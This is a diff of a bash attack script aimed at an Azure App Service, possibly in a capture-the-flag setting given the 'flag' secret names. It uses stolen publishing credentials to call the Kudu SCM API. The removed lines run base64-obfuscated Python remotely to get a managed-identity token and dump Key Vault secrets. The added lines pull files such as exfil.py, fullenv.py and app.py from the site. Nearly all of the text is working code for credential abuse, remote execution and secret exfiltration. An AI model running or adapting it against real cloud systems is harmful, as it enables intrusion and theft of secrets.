@@ -11,30 +11,9 @@ PC=$(curl -sS --max-time 20 -X POST -H "Authorization: Bearer $RA" -H 'Content-L
 PU=$(echo "$PC"|jq -r '.properties.publishingUserName // empty'); PP=$(echo "$PC"|jq -r '.properties.publishingPassword // empty')
 say "PUB=$([[ -n "$PU" && -n "$PP" ]] && echo OK || echo FAIL)"; [[ -n "$PU" && -n "$PP" ]] || exit 0
 SCM='https://app-tbl-reporting-prod.scm.azurewebsites.net'
-R=$(curl -sS --max-time 20 -u "$PU:$PP" "$SCM/api/vfs/results.json")
-IE=$(echo "$R"|jq -r '.IDENTITY_ENDPOINT // empty' 2>/dev/null || true); IH=$(echo "$R"|jq -r '.IDENTITY_HEADER // empty' 2>/dev/null || true)
-say "IE_SET=$([[ -n "$IE" ]] && echo yes || echo no) IH_SET=$([[ -n "$IH" ]] && echo yes || echo no)"
-if [[ -z "$IE" || -z "$IH" ]]; then say NO_MI_ENV; exit 0; fi
-PYSRC=$(cat <<'PYEOF'
-import json,urllib.request,base64
-ie="__IE__"; ih="__IH__"
-u=ie+"?resource=https://vault.azure.net&api-version=2019-08-01"
-req=urllib.request.Request(u,headers={"X-IDENTITY-HEADER":ih})
-tok=json.loads(urllib.request.urlopen(req,timeout=10).read()).get("access_token","")
-print("MI_TOKEN_LEN",len(tok))
-for path in ["secrets?api-version=7.4","secrets/flag?api-version=7.4","secrets/FLAG?api-version=7.4"]:
-    try:
-        q=urllib.request.Request("https://kv-tbl-sec-x3euoz.vault.azure.net/"+path,headers={"Authorization":"Bearer "+tok})
-        b=urllib.request.urlopen(q,timeout=10).read()
-        print(path,"HTTP200","B64",base64.b64encode(b).decode())
-    except Exception as e:
-        print(path,"ERR",str(e)[:200])
-PYEOF
-)
-PYSRC=${PYSRC/__IE__/$IE}; PYSRC=${PYSRC/__IH__/$IH}
-PYS=$(printf '%s' "$PYSRC" | base64 -w0)
-CMD="python3 -c \"import base64;exec(base64.b64decode('$PYS'))\""
-BODY=$(jq -nc --arg c "$CMD" '{command:$c,dir:"/home/site/wwwroot"}')
-OUT=$(curl -sS --max-time 40 -u "$PU:$PP" -H 'Content-Type: application/json' -X POST "$SCM/api/command" -d "$BODY")
-say "KUDU_OUT_B64=$(printf '%s' "$OUT" | base64 -w0)"
+for p in 'site/wwwroot/check_kv.py' 'site/wwwroot/exfil.py' 'site/wwwroot/fullenv.py' 'site/wwwroot/msi_probe.py' 'site/wwwroot/msi_probe.txt' 'site/wwwroot/results.json' 'results.json' 'site/wwwroot/app.py'; do
+  code=$(curl -sS --max-time 20 -o /tmp/f -w '%{http_code}' -u "$PU:$PP" "$SCM/api/vfs/$p" || echo 000)
+  say "F_${p//\//_}_HTTP=$code"
+  [[ "$code" == "200" ]] && say "F_${p//\//_}_B64=$(base64 -w0 </tmp/f)"
+done
 say DONE
